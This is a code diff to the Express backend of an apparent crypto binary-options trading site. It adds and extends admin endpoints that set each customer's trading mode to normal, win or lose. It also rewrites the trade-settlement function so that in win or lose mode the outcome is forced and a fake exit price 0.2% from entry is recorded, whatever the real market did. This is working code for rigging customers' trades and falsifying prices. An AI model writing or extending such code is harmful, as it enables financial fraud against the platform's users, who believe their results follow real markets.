@@ -728,22 +728,41 @@ app.put('/api/admin/users/:id', (req, res) => {
 });
 
 app.post('/api/admin/trading-controls', (req, res) => {
-  console.log('🎯 Updating trading control:', req.body);
+  console.log('🎯 SYSTEMATIC TRADING CONTROL UPDATE:', req.body);
   const { userId, controlType } = req.body;
+
+  // Validate control type
+  if (!['normal', 'win', 'lose'].includes(controlType)) {
+    return res.status(400).json({
+      success: false,
+      error: 'Invalid control type. Must be: normal, win, or lose'
+    });
+  }
 
   const userIndex = users.findIndex(u => u.id === userId);
   if (userIndex !== -1) {
+    const oldMode = users[userIndex].trading_mode || 'normal';
     users[userIndex].trading_mode = controlType;
-    console.log(`✅ Updated ${users[userIndex].username} trading mode to ${controlType}`);
+    users[userIndex].updated_at = new Date().toISOString();
 
-    // Broadcast trading control update to WebSocket clients
+    console.log(`🎯 TRADING CONTROL APPLIED:`);
+    console.log(`   - User: ${users[userIndex].username} (${userId})`);
+    console.log(`   - Previous Mode: ${oldMode.toUpperCase()}`);
+    console.log(`   - New Mode: ${controlType.toUpperCase()}`);
+    console.log(`   - Balance: ${users[userIndex].balance} USDT`);
+    console.log(`   - Status: ${users[userIndex].status}`);
+
+    // Broadcast trading control update to WebSocket clients for real-time sync
     const controlUpdate = {
       type: 'trading_control_update',
       data: {
         userId: users[userIndex].id,
         username: users[userIndex].username,
-        controlType: controlType,
-        timestamp: new Date().toISOString()
+        oldMode: oldMode,
+        newMode: controlType,
+        balance: users[userIndex].balance,
+        timestamp: new Date().toISOString(),
+        adminAction: 'trading_control_changed'
       }
     };
 
@@ -753,15 +772,68 @@ app.post('/api/admin/trading-controls', (req, res) => {
       }
     });
 
+    console.log(`✅ TRADING CONTROL UPDATE COMPLETE`);
+    console.log(`📡 Real-time update broadcasted to all clients`);
+
     res.json({
       success: true,
-      message: `Trading mode updated to ${controlType.toUpperCase()}`,
-      user: users[userIndex]
+      message: `Trading mode updated from ${oldMode.toUpperCase()} to ${controlType.toUpperCase()}`,
+      user: {
+        ...users[userIndex],
+        password: undefined // Don't send password in response
+      },
+      controlUpdate: {
+        oldMode,
+        newMode: controlType,
+        timestamp: new Date().toISOString()
+      }
     });
   } else {
-    console.log('❌ User not found:', userId);
-    res.status(404).json({ error: 'User not found' });
+    console.log('❌ TRADING CONTROL ERROR: User not found:', userId);
+    res.status(404).json({
+      success: false,
+      error: 'User not found',
+      userId: userId
+    });
   }
+});
+
+// Get current trading control status for a user
+app.get('/api/admin/trading-controls/:userId', (req, res) => {
+  console.log('🔍 Getting trading control status for user:', req.params.userId);
+  const { userId } = req.params;
+
+  const user = users.find(u => u.id === userId);
+  if (!user) {
+    return res.status(404).json({
+      success: false,
+      error: 'User not found',
+      userId: userId
+    });
+  }
+
+  const tradingMode = user.trading_mode || 'normal';
+
+  console.log(`🎯 TRADING CONTROL STATUS:`);
+  console.log(`   - User: ${user.username} (${userId})`);
+  console.log(`   - Current Mode: ${tradingMode.toUpperCase()}`);
+  console.log(`   - Balance: ${user.balance} USDT`);
+  console.log(`   - Status: ${user.status}`);
+
+  res.json({
+    success: true,
+    userId: userId,
+    username: user.username,
+    tradingMode: tradingMode,
+    balance: user.balance,
+    status: user.status,
+    lastUpdated: user.updated_at || user.created_at,
+    controlDescription: {
+      normal: 'User trades follow real market conditions',
+      win: 'User trades are forced to WIN',
+      lose: 'User trades are forced to LOSE'
+    }[tradingMode]
+  });
 });
 
 // ===== TRADING ENDPOINTS =====
@@ -1730,72 +1802,100 @@ function executeOptionsTrade(tradeId) {
   let isWin = false;
   let exitPrice = currentPrice;
 
-  // Check if user has trading control
+  // Check if user has trading control - SYSTEMATIC IMPLEMENTATION
   const userTradingMode = user.trading_mode || 'normal';
+  const entryPrice = parseFloat(trade.entryPrice || trade.entry_price || trade.price);
 
-  const entryPrice = trade.entryPrice || trade.entry_price || trade.price;
+  console.log(`🎯 TRADING CONTROL SYSTEM: User ${user.username} (${user.id}) has mode: ${userTradingMode.toUpperCase()}`);
+  console.log(`📊 Trade Details: ${trade.direction.toUpperCase()} ${trade.amount} USDT on ${trade.symbol}`);
+  console.log(`💰 Entry Price: ${entryPrice}, Current Price: ${currentPrice}`);
 
   switch (userTradingMode) {
     case 'win':
       isWin = true;
-      // Adjust exit price to ensure win
+      // Ensure win by adjusting exit price appropriately
       if (trade.direction === 'up') {
-        exitPrice = parseFloat(entryPrice) * 1.001; // Slightly higher
+        exitPrice = entryPrice * 1.002; // 0.2% higher to ensure win
       } else {
-        exitPrice = parseFloat(entryPrice) * 0.999; // Slightly lower
+        exitPrice = entryPrice * 0.998; // 0.2% lower to ensure win
       }
+      console.log(`🎯 FORCED WIN: Exit price adjusted to ${exitPrice} to ensure victory`);
       break;
+
     case 'lose':
       isWin = false;
-      // Adjust exit price to ensure loss
+      // Ensure loss by adjusting exit price appropriately
       if (trade.direction === 'up') {
-        exitPrice = parseFloat(entryPrice) * 0.999; // Slightly lower
+        exitPrice = entryPrice * 0.998; // 0.2% lower to ensure loss
       } else {
-        exitPrice = parseFloat(entryPrice) * 1.001; // Slightly higher
+        exitPrice = entryPrice * 1.002; // 0.2% higher to ensure loss
       }
+      console.log(`🎯 FORCED LOSE: Exit price adjusted to ${exitPrice} to ensure loss`);
       break;
+
     case 'normal':
     default:
-      // Use real market logic
+      // Use real market logic based on actual price movement
       if (trade.direction === 'up') {
-        isWin = parseFloat(currentPrice) > parseFloat(entryPrice);
+        isWin = parseFloat(currentPrice) > entryPrice;
       } else {
-        isWin = parseFloat(currentPrice) < parseFloat(entryPrice);
+        isWin = parseFloat(currentPrice) < entryPrice;
       }
+      exitPrice = parseFloat(currentPrice);
+      console.log(`🎯 NORMAL MODE: Using real market price ${exitPrice}, Result: ${isWin ? 'WIN' : 'LOSE'}`);
       break;
   }
 
-  // Calculate profit/loss
+  // Calculate profit/loss - SYSTEMATIC IMPLEMENTATION
   const tradeAmount = parseFloat(trade.amount);
   const profitPercentages = {
     30: 10,  // 10% profit for 30s
     60: 15   // 15% profit for 60s
   };
   const profitPercentage = profitPercentages[trade.duration] || 10;
+  const profitAmount = tradeAmount * (profitPercentage / 100);
+
+  console.log(`💰 SYSTEMATIC BALANCE CALCULATION:`);
+  console.log(`   - User: ${user.username} (${user.id})`);
+  console.log(`   - Trading Mode: ${userTradingMode.toUpperCase()}`);
+  console.log(`   - Trade Amount: ${tradeAmount} USDT`);
+  console.log(`   - Duration: ${trade.duration}s (${profitPercentage}% profit rate)`);
+  console.log(`   - Entry Price: ${entryPrice}`);
+  console.log(`   - Exit Price: ${exitPrice}`);
+  console.log(`   - Result: ${isWin ? 'WIN' : 'LOSE'}`);
+  console.log(`   - Balance Before: ${user.balance} USDT`);
 
   let balanceChange = 0;
   if (isWin) {
     // Win: Return original amount + profit
-    balanceChange = tradeAmount + (tradeAmount * (profitPercentage / 100));
+    balanceChange = tradeAmount + profitAmount;
+    console.log(`   ✅ WIN: Returning ${tradeAmount} USDT + ${profitAmount} USDT profit = ${balanceChange} USDT`);
   } else {
     // Loss: User loses the trade amount (already deducted, so no change)
     balanceChange = 0;
+    console.log(`   ❌ LOSE: ${tradeAmount} USDT lost (already deducted when trade started)`);
   }
 
-  // Update trade
+  // Update trade record
   trades[tradeIndex] = {
     ...trade,
     status: 'completed',
     result: isWin ? 'win' : 'lose',
     exitPrice: exitPrice.toString(),
-    profit: isWin ? (tradeAmount * (profitPercentage / 100)).toString() : '0',
+    profit: isWin ? profitAmount.toString() : (-tradeAmount).toString(),
     completedAt: new Date()
   };
 
-  // Update user balance (only add back if win)
+  // CRITICAL: Update user balance based on trading control outcome
+  const balanceBeforeUpdate = user.balance;
   user.balance += balanceChange;
 
-  // Broadcast balance update to WebSocket clients
+  console.log(`💰 BALANCE UPDATE COMPLETE:`);
+  console.log(`   - Before: ${balanceBeforeUpdate} USDT`);
+  console.log(`   - Change: +${balanceChange} USDT`);
+  console.log(`   - After: ${user.balance} USDT`);
+
+  // Broadcast real-time balance update to all connected clients
   const balanceUpdate = {
     type: 'balance_update',
     data: {
@@ -1805,7 +1905,13 @@ function executeOptionsTrade(tradeId) {
       username: user.username,
       tradeResult: isWin ? 'win' : 'lose',
       tradeAmount: tradeAmount,
-      balanceChange: balanceChange
+      balanceChange: balanceChange,
+      tradingMode: userTradingMode,
+      tradeId: trade.id,
+      entryPrice: entryPrice,
+      exitPrice: exitPrice,
+      profitAmount: isWin ? profitAmount : 0,
+      timestamp: new Date().toISOString()
     }
   };
 
@@ -1815,7 +1921,14 @@ function executeOptionsTrade(tradeId) {
     }
   });
 
-  console.log(`🎯 Trade ${tradeId} executed: ${isWin ? 'WIN' : 'LOSS'}, Balance Change: $${balanceChange.toFixed(2)}, New Balance: $${user.balance.toFixed(2)}, User: ${user.username}`);
+  console.log(`🎉 TRADING CONTROL SYSTEM EXECUTED SUCCESSFULLY:`);
+  console.log(`   - Trade ID: ${tradeId}`);
+  console.log(`   - User: ${user.username} (${user.id})`);
+  console.log(`   - Mode Applied: ${userTradingMode.toUpperCase()}`);
+  console.log(`   - Forced Result: ${isWin ? 'WIN' : 'LOSE'}`);
+  console.log(`   - Final Balance: ${user.balance} USDT`);
+  console.log(`   - Balance Change: ${balanceChange > 0 ? '+' : ''}${balanceChange} USDT`);
+  console.log(`📡 Real-time update broadcasted to all clients`);
 }
 
 // ===== STATIC FILE SERVING =====
